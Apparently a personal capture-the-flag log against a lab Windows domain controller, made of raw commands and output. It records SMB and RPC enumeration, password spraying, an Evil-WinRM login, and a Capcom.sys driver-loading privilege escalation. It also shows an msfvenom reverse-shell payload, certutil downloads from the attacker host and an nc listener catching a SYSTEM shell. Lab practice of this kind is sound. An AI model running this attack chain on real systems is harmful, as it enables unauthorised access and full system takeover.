# Nmap 7.95 scan initiated Tue Sep 23 09:45:40 2025 as: /usr/lib/nmap/nmap --privileged -sS -p- --open --min-rate 5000 -n -Pn -oN scan.txt 192.168.69.69
Nmap scan report for 192.168.69.69
Host is up (0.0011s latency).
Not shown: 55508 closed tcp ports (reset), 10003 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49676/tcp open  unknown
49686/tcp open  unknown
MAC Address: 08:00:27:2A:B8:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

# Nmap done at Tue Sep 23 09:45:56 2025 -- 1 IP address (1 host up) scanned in 16.07 seconds


===========================================================================================================================================================================
# Nmap 7.95 scan initiated Tue Sep 23 09:48:37 2025 as: /usr/lib/nmap/nmap --privileged -sVC -p135,139,3268,3269,389,445,464,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49686,53,593,5985,636,88,9389 -n -Pn -vvv -oN fullscan.txt 192.168.69.69
Nmap scan report for 192.168.69.69
Host is up, received arp-response (0.00023s latency).
Scanned at 2025-09-23 09:48:37 EDT for 64s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2025-09-23 06:48:43Z)
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 128
464/tcp   open  kpasswd5?     syn-ack ttl 128
593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 128
3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 128
5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
47001/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49686/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 08:00:27:2A:B8:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10415/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 18519/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 43315/udp): CLEAN (Timeout)
|   Check 4 (port 24601/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-09-23T06:49:31
|_  start_date: 2025-09-23T06:40:41
| nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:2a:b8:f8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   PACHARAN<00>         Flags: <group><active>
|   WIN-VRU3GG3DPLJ<00>  Flags: <unique><active>
|   PACHARAN<1c>         Flags: <group><active>
|   WIN-VRU3GG3DPLJ<20>  Flags: <unique><active>
|   PACHARAN<1b>         Flags: <unique><active>
| Statistics:
|   08:00:27:2a:b8:f8:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -7h00m01s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 23 09:49:41 2025 -- 1 IP address (1 host up) scanned in 64.06 seconds

===========================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/pacharan]
└─$ netexec smb 192.168.69.69                                               
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
                                                           
===========================================================================================================================================================================

──(kali㉿kali)-[~/Documents/pacharan]
└─$ smbclient -L //192.168.69.69 -N    

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
        NETLOGON2       Disk      
        PACHARAN        Disk      
        PDF Pro Virtual Printer Printer   Soy Hacker y arreglo impresoras
        print$          Disk      Controladores de impresora
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.69.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


===========================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/pacharan]
└─$ smbclient \\\\192.168.69.69\\NETLOGON2 -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 31 13:25:34 2024
  ..                                  D        0  Wed Jul 31 13:25:34 2024
  Orujo.txt                           A       22  Wed Jul 31 13:25:55 2024

                7735807 blocks of size 4096. 4733146 blocks available
smb: \> get Orujo.txt
getting file \Orujo.txt of size 22 as Orujo.txt (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
smb: \> exit
                                

===========================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/pacharan]
└─$ cat Orujo.txt           
Pericodelospalotes6969  

===========================================================================================================================================================================
                                                                                                                 
┌──(kali㉿kali)-[~/Documents/pacharan]
└─$ rpcclient -U "Orujo%Pericodelospalotes6969" 192.168.69.69         


rpcclient $> enumdomusers
user:[Administrador] rid:[0x1f4]
user:[Invitado] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[Orujo] rid:[0x44f]
user:[Ginebra] rid:[0x450]
user:[Whisky] rid:[0x452]
user:[Hendrick] rid:[0x453]
user:[Chivas Regal] rid:[0x454]
user:[Whisky2] rid:[0x457]
user:[JB] rid:[0x458]
user:[Chivas] rid:[0x459]
user:[beefeater] rid:[0x45a]
user:[CarlosV] rid:[0x45b]
user:[RedLabel] rid:[0x45c]
user:[Gordons] rid:[0x45d]
rpcclient $>



* Extrae solo los nombres de los Usuarios
```bash
cat userK.txt | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' | sponge userK.txt 
```

```bash
cat userK.txt | grep -oP '(?<=\[).*?(?=\])' | grep -v "0x" > usuarios_limpios.txt
```

===========================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/pacharan]
└─$ cat usuarios.txt 
Administrador
Invitado
krbtgt
DefaultAccount
Orujo
Ginebra
Whisky
Hendrick
Chivas Regal
Whisky2
JB
Chivas
beefeater
CarlosV
RedLabel
Gordons


===========================================================================================================================================================================
──(kali㉿kali)-[~/Documents/pacharan]
└─$ smbclient \\\\192.168.69.69\\PACHARAN -U Orujo
Password for [WORKGROUP\Orujo]:Pericodelospalotes6969
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 31 13:21:13 2024
  ..                                  D        0  Wed Jul 31 13:21:13 2024
  ah.txt                              A      921  Wed Jul 31 13:20:16 2024

                7735807 blocks of size 4096. 4732618 blocks available
smb: \> get ah.txt 
getting file \ah.txt of size 921 as ah.txt (299.8 KiloBytes/sec) (average 299.8 KiloBytes/sec)
smb: \> exit
                                               

===========================================================================================================================================================================
──(kali㉿kali)-[~/Documents/pacharan]
└─$ cat ah.txt   
Mamasoystreamer1!
Mamasoystreamer2@
Mamasoystreamer3#
Mamasoystreamer4$
Mamasoystreamer5%
Mamasoystreamer6^
Mamasoystreamer7&
Mamasoystreamer8*
Mamasoystreamer9(
Mamasoystreamer10)
MamasoyStreamer11!
MamasoyStreamer12@
MamasoyStreamer13#
MamasoyStreamer14$
MamasoyStreamer15%
MamasoyStreamer16^
MamasoyStreamer17&
MamasoyStreamer18*
MamasoyStreamer19(
MamasoyStreamer20)
MamaSoyStreamer1!
MamaSoyStreamer2@
MamaSoyStreamer3#
MamaSoyStreamer4$
MamaSoyStreamer5%
MamaSoyStreamer6^
MamaSoyStreamer7&
MamaSoyStreamer8*
MamaSoyStreamer9(
MamaSoyStreamer10)
MamasoyStream1er!
MamasoyStream2er@
MamasoyStream3er#
MamasoyStream4er$
MamasoyStream5er%
MamasoyStream6er^
MamasoyStream7er&
MamasoyStream8er*
MamasoyStream9er(
MamasoyStream10er)
MamasoyStr1amer!
MamasoyStr2amer@
MamasoyStr3amer#
MamasoyStr4amer$
MamasoyStr5amer%
MamasoyStr6amer^
MamasoyStr7amer&
MamasoyStr8amer*
MamasoyStr9amer(
MamasoyStr10amer)
Mamasoystreamer1


===========================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/pacharan]
└─$ netexec smb 192.168.69.69 -u usuarios.txt -p ah.txt --continue-on-success | grep "+"
SMB                      192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@ 
                                                                                                                  

┌──(kali㉿kali)-[~/Documents/pacharan]
└─$ netexec smb 192.168.69.69 -u 'Whisky' -p 'MamasoyStream2er@' 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@ 


===========================================================================================================================================================================
──(kali㉿kali)-[~/Documents/pacharan]
└─$ rpcclient -U 'Whisky%MamasoyStream2er@' 192.168.69.69

rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
        description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]
        comment:[Soy Hacker y arreglo impresoras]


clave:TurkisArrusPuchuchuSiu1

===========================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/pacharan]
└─$ netexec smb 192.168.69.69 -u usuarios.txt -p 'TurkisArrusPuchuchuSiu1' --continue-on-success | grep "+"
SMB                      192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1 
                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/pacharan]
└─$ netexec smb 192.168.69.69 -u 'Regal' -p 'TurkisArrusPuchuchuSiu1'                     
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Regal:TurkisArrusPuchuchuSiu1 (Guest)


===========================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/pacharan]
└─$ evil-winrm -i 192.168.69.69 -u 'Regal' -p 'TurkisArrusPuchuchuSiu1'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
                                                                              



*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> whoami
pacharan\chivas regal


===========================================================================================================================================================================

*Evil-WinRM* PS C:\Users\Chivas Regal> cd Desktop
*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> ls


    Directorio: C:\Users\Chivas Regal\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/1/2024  10:29 AM             36 user.txt


*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> type user.txt
bb8b4df8eda73e75ca51ca88a909c1cb  -

===========================================================================================================================================================================
*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> whoami /priv

INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                     Estado
============================= =============================================== ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio        Habilitada
SeLoadDriverPrivilege         Cargar y descargar controladores de dispositivo Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido                Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso    Habilitada


===========================================================================================================================================================================

https://github.com/JoshMorrison99/SeLoadDriverPrivilege



(kali㉿kali)-[~/Documents/pacharan/SeLoadDriverPrivilege]

Capcom.sys  ExploitCapcom.exe  LoadDriver.exe  README.md




┌──(kali㉿kali)-[~/Documents/pacharan/SeLoadDriverPrivilege]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.69.3 LPORT=4444 -f exe -o rev.exe
Saved as: rev.exe




*Evil-WinRM* PS C:\> mkdir temp


    Directorio: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/23/2025  10:57 AM                temp


*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> certutil -urlcache -f http://192.168.69.3:8000/rev.exe rev.exe
****  En línea  ****


*Evil-WinRM* PS C:\temp> certutil -urlcache -f http://192.168.69.3:8000/rev.exe rev.exe
****  En línea  ****
CertUtil: -URLCache comando completado correctamente.

*Evil-WinRM* PS C:\temp> certutil -urlcache -f http://192.168.69.3:8000/Capcom.sys Capcom.sys
****  En línea  ****
CertUtil: -URLCache comando completado correctamente.


*Evil-WinRM* PS C:\temp> certutil -urlcache -f http://192.168.69.3:8000/ExploitCapcom.exe ExploitCapcom.exe
****  En línea  ****
CertUtil: -URLCache comando completado correctamente.


*Evil-WinRM* PS C:\temp> certutil -urlcache -f http://192.168.69.3:8000/LoadDriver.exe LoadDriver.exe
****  En línea  ****
CertUtil: -URLCache comando completado correctamente.

===========================================================================================================================================================================

*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe
[+] No path was given. Default path C:\ProgramData\rev.exe
[*] Capcom.sys exploit
[-] CreateFile failed



*Evil-WinRM* PS C:\temp> .\LoadDriver.exe System\CurrentControlSet\MyService Capcom.sys
RegCreateKeyEx failed: 0x0
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\System\CurrentControlSet\MyService
NTSTATUS: 00000000, WinError: 0




┌──(kali㉿kali)-[~/Documents/pacharan/SeLoadDriverPrivilege]
└─$ nc -lvnp 4444    




*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe C:\temp\rev.exe
 
[+] Path is: C:\temp\rev.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 00000193C5AE0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program





┌──(kali㉿kali)-[~/Documents/pacharan/SeLoadDriverPrivilege]
└─$ nc -lvnp 4444    
listening on [any] 4444 ...
connect to [192.168.69.3] from (UNKNOWN) [192.168.69.69] 65285
Microsoft Windows [Versi�n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\temp>whoami
whoami
nt authority\system




===========================================================================================================================================================================

C:\Users\Administrador>cd Desktop
cd Desktop

C:\Users\Administrador\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 5E12-227F

 Directorio de C:\Users\Administrador\Desktop

01/08/2024  10:30    <DIR>          .
01/08/2024  10:30    <DIR>          ..
01/08/2024  10:29                36 root.txt
               1 archivos             36 bytes
               2 dirs  19.369.136.128 bytes libres


C:\Users\Administrador\Desktop>type root.txt
type root.txt




cfa7cb1cc20e26c0428f9222d44c76a0  -

C:\Users\Administrador\Desktop>


===========================================================================================================================================================================
